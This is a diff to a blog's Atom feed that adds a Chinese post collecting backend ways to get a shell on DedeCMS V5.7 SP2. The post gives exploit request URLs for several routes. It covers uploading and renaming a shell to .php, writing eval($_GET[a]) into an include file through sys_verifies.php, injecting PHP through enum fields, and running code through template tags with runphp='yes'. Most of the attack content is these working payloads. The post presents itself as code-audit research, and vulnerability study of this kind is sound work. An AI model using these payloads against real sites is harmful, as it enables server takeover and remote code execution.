@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://sunu11.com/"/>
-  <updated>2018-03-06T12:03:38.486Z</updated>
+  <updated>2018-04-03T06:29:22.853Z</updated>
   <id>http://sunu11.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>DedeCMS V5.7 SP2后台漏洞小集合</title>
+    <link href="http://sunu11.com/2018/04/03/19/"/>
+    <id>http://sunu11.com/2018/04/03/19/</id>
+    <published>2018-04-03T06:20:22.000Z</published>
+    <updated>2018-04-03T06:29:22.853Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="记录一下最新版dedecms后台拿服务器的几个方式。"><a href="#记录一下最新版dedecms后台拿服务器的几个方式。" class="headerlink" title="记录一下最新版dedecms后台拿服务器的几个方式。"></a>记录一下最新版dedecms后台拿服务器的几个方式。</h3><p><strong>01、上传shell</strong></p><p>1、后台上传flash文件处未对文件内容作校验，可直接上传shell。<br>2、通过重命名功能：<a id="more"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/dede/file_manage_control.php?fmdo=rename&amp;oldfilename=/uploads/media/xxx/xxxx.swf&amp;newfilename=/sunu11.php</div></pre></td></tr></table></figure><p><strong>02、写入配置</strong><br>/dede/sys_verifies.php中可写进恶意代码至inc文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1、http://localhost/dedecms/uploads/dede/sys_verifies.php?action=getfiles&amp;refiles[0]=123&amp;refiles[1]=\%22;eval($_GET[a]);die();//</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">2、http://localhost/dedecms/uploads/dede/sys_verifies.php?action=down&amp;a=phpinfo();</div></pre></td></tr></table></figure><p><strong>03、数据库写入数据未过滤：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/dedecms/uploads/dede/stepselect_main.php?action=addenum_save&amp;ename=xxx&amp;egroup=;phpinfo();$&amp;issign=1</div></pre></td></tr></table></figure><p>查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://localhost/dedecms/uploads/dede/sys_cache_up.php?step=2&amp;egroup=a=1;phpinfo();&amp;dopost=ok</div><div class="line">or:</div><div class="line">http://localhost/data/enums/;phpinfo();$.php</div></pre></td></tr></table></figure><p><strong>05、模板问题：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/dede/tag_test_action.php?url=a&amp;token=xxxxx&amp;partcode=&#123;dede:mochazz name=&apos;source&apos; runphp=&apos;yes&apos;&#125;phpinfo();&#123;/dede:mochazz&#125;</div></pre></td></tr></table></figure></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;记录一下最新版dedecms后台拿服务器的几个方式。&quot;&gt;&lt;a href=&quot;#记录一下最新版dedecms后台拿服务器的几个方式。&quot; class=&quot;headerlink&quot; title=&quot;记录一下最新版dedecms后台拿服务器的几个方式。&quot;&gt;&lt;/a&gt;记录一下最新版dedecms后台拿服务器的几个方式。&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;01、上传shell&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;1、后台上传flash文件处未对文件内容作校验，可直接上传shell。&lt;br&gt;2、通过重命名功能：
+    
+    </summary>
+    
+      <category term="代码审计" scheme="http://sunu11.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+    
+      <category term="Dedecms" scheme="http://sunu11.com/tags/Dedecms/"/>
+    
+      <category term="getshell" scheme="http://sunu11.com/tags/getshell/"/>
+    
+      <category term="后台" scheme="http://sunu11.com/tags/%E5%90%8E%E5%8F%B0/"/>
+    
+  </entry>
   
   <entry>
     <title>内网渗透之反弹shell的几种姿势</title>
